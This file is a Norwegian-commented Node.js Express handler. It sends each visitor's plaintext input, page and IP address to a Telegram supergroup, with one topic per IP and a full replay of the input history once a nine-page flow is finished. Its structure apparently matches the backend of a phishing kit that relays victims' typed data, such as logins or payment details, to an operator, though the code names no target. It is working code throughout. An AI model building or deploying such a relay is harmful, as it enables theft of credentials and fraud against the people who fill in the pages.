// api/log_data.js — Express handler (CommonJS)
const crypto = require('crypto');

// Telegram Bot API konfigurasjon
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Supergruppe ID (må være en supergruppe for topics)

// Cache for å lagre mapping mellom IP-adresse og topic/message_thread_id
// I produksjon kan du bruke en database i stedet
const ipToTopicMap = new Map();
const ipToFullTopicMap = new Map();
const ipLogHistory = new Map();
const ipFullTopicSynced = new Set();

function getFullTopicName(ipAddress) {
  return `Full: ${ipAddress}`;
}

function appendLogHistory(ipAddress, entry) {
  if (!ipLogHistory.has(ipAddress)) {
    ipLogHistory.set(ipAddress, []);
  }
  ipLogHistory.get(ipAddress).push(entry);
}

function getLogHistory(ipAddress) {
  return ipLogHistory.get(ipAddress) || [];
}

const PAGE_FLOW_ORDER = {
  'page1.5.html': 1,
  'page1.7.html': 2,
  'page2.html': 3,
  'page3.html': 4,
  'page3.5.html': 5,
  'page4.html': 6,
  'page5.html': 7,
  'page6.html': 8,
  'page7.html': 9,
};

function getPageFlowOrder(page) {
  return PAGE_FLOW_ORDER[page] ?? 999;
}

function getOrderedLogHistory(ipAddress) {
  return [...getLogHistory(ipAddress)].sort((a, b) => {
    const pageOrder = getPageFlowOrder(a.page) - getPageFlowOrder(b.page);
    if (pageOrder !== 0) {
      return pageOrder;
    }

    return new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime();
  });
}

/**
 * Sjekker om et topic med gitt navn allerede eksisterer i supergruppen
 */
async function findExistingTopicByName(topicName) {
  try {
    let offset = 0;
    const limit = 100;
    let hasMore = true;

    while (hasMore) {
      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getForumTopics`;

      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          offset: offset,
          limit: limit,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        console.log(`getForumTopics feilet: ${errorData.description || response.statusText}`);
        return null;
      }

      const result = await response.json();

      if (result.ok && result.result && result.result.topics) {
        const existingTopic = result.result.topics.find(
          topic => topic.name === topicName
        );

        if (existingTopic) {
          console.log(`Fant eksisterende topic "${topicName}": ${existingTopic.message_thread_id}`);
          return existingTopic.message_thread_id;
        }

        if (result.result.topics.length < limit) {
          hasMore = false;
        } else {
          offset += limit;
        }
      } else {
        hasMore = false;
      }
    }

    return null;
  } catch (error) {
    console.error(`Feil ved søk etter topic "${topicName}":`, error);
    return null;
  }
}

async function findExistingTopicForIP(ipAddress) {
  return findExistingTopicByName(`IP: ${ipAddress}`);
}

/**
 * Oppretter et nytt forum-topic i supergruppen
 */
async function createForumTopic(topicName, iconColor = 0x6FB9F0) {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/createForumTopic`;

  const response = await fetch(telegramApiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      name: topicName,
      icon_color: iconColor,
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();

    if (errorData.description && errorData.description.includes('already exists')) {
      console.log(`Topic "${topicName}" eksisterer allerede, søker etter det...`);
      const existingTopicId = await findExistingTopicByName(topicName);
      if (existingTopicId) {
        return existingTopicId;
      }
    }

    if (errorData.error_code === 400) {
      throw new Error('Topics ikke støttet - sjekk at gruppen er en supergruppe med topics aktivert');
    }
    throw new Error(`Kunne ikke opprette topic: ${errorData.description || response.statusText}`);
  }

  const result = await response.json();
  console.log(`Opprettet nytt topic "${topicName}": ${result.result.message_thread_id}`);
  return result.result.message_thread_id;
}

async function getOrCreateTopicByName(topicName, iconColor = 0x6FB9F0) {
  const existingTopicId = await findExistingTopicByName(topicName);
  if (existingTopicId) {
    return existingTopicId;
  }

  try {
    return await createForumTopic(topicName, iconColor);
  } catch (error) {
    console.error(`Kunne ikke opprette topic "${topicName}":`, error);

    if (error.message && error.message.includes('already exists')) {
      return await findExistingTopicByName(topicName);
    }

    return null;
  }
}

/**
 * Oppretter eller henter topic ID for en IP-adresse
 * Hvis det er en ny IP, oppretter vi et nytt topic i supergruppen
 */
async function getOrCreateTopicForIP(ipAddress) {
  if (ipToTopicMap.has(ipAddress)) {
    return ipToTopicMap.get(ipAddress);
  }

  const topicId = await getOrCreateTopicByName(`IP: ${ipAddress}`, 0x6FB9F0);
  if (topicId) {
    ipToTopicMap.set(ipAddress, topicId);
  }
  return topicId;
}

/**
 * Oppretter eller henter "Full"-topic når brukeren har fullført flyten
 */
async function getOrCreateFullTopicForIP(ipAddress) {
  if (ipToFullTopicMap.has(ipAddress)) {
    return ipToFullTopicMap.get(ipAddress);
  }

  const topicId = await getOrCreateTopicByName(getFullTopicName(ipAddress), 0x8EEE98);
  if (topicId) {
    ipToFullTopicMap.set(ipAddress, topicId);
  }
  return topicId;
}

/**
 * Oppretter et nytt topic i supergruppen for en IP-adresse
 */
async function createTopicForIP(ipAddress) {
  return createForumTopic(`IP: ${ipAddress}`, 0x6FB9F0);
}

/**
 * Sender en melding til Telegram (i et topic hvis topicId er gitt)
 */
async function sendToTelegram(chatId, message, topicId = null) {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML', // Bruker HTML for formatering
  };

  // Hvis topicId er gitt, legg til message_thread_id for å sende til riktig topic
  if (topicId !== null) {
    payload.message_thread_id = topicId;
  }
  
  const response = await fetch(telegramApiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(`Telegram API error: ${errorData.description || response.statusText}`);
  }

  return await response.json();
}

/**
 * Formaterer data til en lesbar Telegram-melding
 */
function formatTelegramMessage(data, isNewIPAddress = false) {
  const { page, event_description, klartekst_input, ip_adresse, session_uid, timestamp } = data;
  
  let message = '';
  
  // Hvis dette er en ny IP-adresse, legg til en velkomstmelding
  if (isNewIPAddress) {
    message += `🆕 <b>Ny bruker opprettet</b>\n`;
    message += `📍 <b>IP-adresse:</b> <code>${ip_adresse}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
  }
  
  // Standard aktivitetsmelding
  message += `🔔 <b>Aktivitet</b>\n`;
  message += `📄 <b>Side:</b> ${page || 'Ukjent'}\n`;
  message += `📝 <b>Hendelse:</b> ${event_description || 'Ingen beskrivelse'}\n`;
  
  if (klartekst_input) {
    message += `✏️ <b>Input:</b> <code>${klartekst_input}</code>\n`;
  }
  
  if (session_uid) {
    message += `🆔 <b>Session ID:</b> <code>${session_uid}</code>\n`;
  }

  const formattedTime = timestamp
    ? new Date(timestamp).toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' })
    : new Date().toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' });
  
  message += `\n⏰ <b>Tid:</b> ${formattedTime}`;
  
  return message;
}

function formatCompletionMessage(data, isNewFullTopic = false) {
  const { page, event_description, klartekst_input, ip_adresse, session_uid } = data;

  let message = '';

  if (isNewFullTopic) {
    message += `✅ <b>Fullført flyt</b>\n`;
    message += `📍 <b>IP-adresse:</b> <code>${ip_adresse}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    message += `✅ <b>Flyt fullført (oppdatering)</b>\n\n`;
  }

  message += `📄 <b>Siste side:</b> ${page || 'Ukjent'}\n`;
  message += `📝 <b>Hendelse:</b> ${event_description || 'Ingen beskrivelse'}\n`;

  if (klartekst_input) {
    message += `✏️ <b>Input:</b> <code>${klartekst_input}</code>\n`;
  }

  if (session_uid) {
    message += `🆔 <b>Session ID:</b> <code>${session_uid}</code>\n`;
  }

  message += `\n⏰ <b>Tid:</b> ${new Date().toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' })}`;

  return message;
}

async function syncFullTopicHistory(ipAddress, fullTopicId, currentData) {
  const completionMessage = formatCompletionMessage(currentData, true);
  const history = getOrderedLogHistory(ipAddress);

  for (const entry of history) {
    const historyMessage = formatTelegramMessage({
      page: entry.page,
      event_description: entry.event_description,
      klartekst_input: entry.klartekst_input,
      ip_adresse: ipAddress,
      session_uid: entry.session_uid,
      timestamp: entry.timestamp,
    }, false);

    await sendToTelegram(TELEGRAM_CHAT_ID, historyMessage, fullTopicId);
  }

  await sendToTelegram(TELEGRAM_CHAT_ID, completionMessage, fullTopicId);

  ipFullTopicSynced.add(ipAddress);
  console.log(`Historikk (${history.length} logger) sendt i flytrekkefølge til topic "${getFullTopicName(ipAddress)}"`);
}

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Kun POST er tillatt' });
  }

  try {
    // Valider at Telegram-konfigurasjonen er satt
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      throw new Error('TELEGRAM_BOT_TOKEN eller TELEGRAM_CHAT_ID er ikke satt i miljøvariabler');
    }

    const { page, event_description, klartekst_input, session_uid: client_session_uid, flow_completed } = req.body;
    
    // Hent IP-adresse fra headers (Vercel setter x-forwarded-for)
    const forwardedFor = req.headers['x-forwarded-for'];
    const ip_adresse = forwardedFor 
      ? forwardedFor.split(',')[0].trim() // Tar første IP hvis det er flere
      : req.headers['x-real-ip'] || req.socket.remoteAddress || 'Ukjent IP';

    let session_uid = client_session_uid;

    // Hvis klientsiden ikke sendte en UID, generer en ny
    if (!session_uid) {
      session_uid = crypto.randomUUID();
      console.log('Genererte ny session_uid på serveren:', session_uid);
    } else {
      console.log('Mottok session_uid fra klienten:', session_uid);
    }

    // Sjekk om dette er en ny IP-adresse før vi oppretter topic
    const isNewIPAddress = !ipToTopicMap.has(ip_adresse);

    const logEntry = {
      page,
      event_description,
      klartekst_input,
      session_uid,
      timestamp: new Date().toISOString(),
    };
    appendLogHistory(ip_adresse, logEntry);
    
    // Hent eller opprett topic for denne IP-adressen
    const topicId = await getOrCreateTopicForIP(ip_adresse);

    // Formater meldingen (inkluderer spesiell header hvis ny IP)
    const message = formatTelegramMessage({
      page,
      event_description,
      klartekst_input,
      ip_adresse,
      session_uid,
      timestamp: logEntry.timestamp,
    }, isNewIPAddress);

    // Send til Telegram i riktig topic (hvis topicId er null, sendes det til hovedkanalen)
    await sendToTelegram(TELEGRAM_CHAT_ID, message, topicId);

    // Ekstra "Full"-topic når brukeren har fullført flyten (page4/page6)
    if (flow_completed) {
      const fullTopicId = await getOrCreateFullTopicForIP(ip_adresse);

      if (fullTopicId) {
        const currentData = {
          page,
          event_description,
          klartekst_input,
          ip_adresse,
          session_uid,
        };

        if (!ipFullTopicSynced.has(ip_adresse)) {
          await syncFullTopicHistory(ip_adresse, fullTopicId, currentData);
        } else {
          await sendToTelegram(TELEGRAM_CHAT_ID, message, fullTopicId);
        }

        console.log(`Full-topic oppdatert for IP: ${ip_adresse}`);
      }
    } else if (ipFullTopicSynced.has(ip_adresse)) {
      const fullTopicId = ipToFullTopicMap.get(ip_adresse);
      if (fullTopicId) {
        await sendToTelegram(TELEGRAM_CHAT_ID, message, fullTopicId);
      }
    }

    console.log(`Data sendt til Telegram for IP: ${ip_adresse}`);

    res.status(200).json({ 
      message: 'Data sendt til Telegram!', 
      session_uid: session_uid,
      ip_adresse: ip_adresse 
    });
  } catch (error) {
    console.error('Telegram error:', error);
    res.status(500).json({ message: `Serverfeil: ${error.message}` });
  }
}

module.exports = handler;
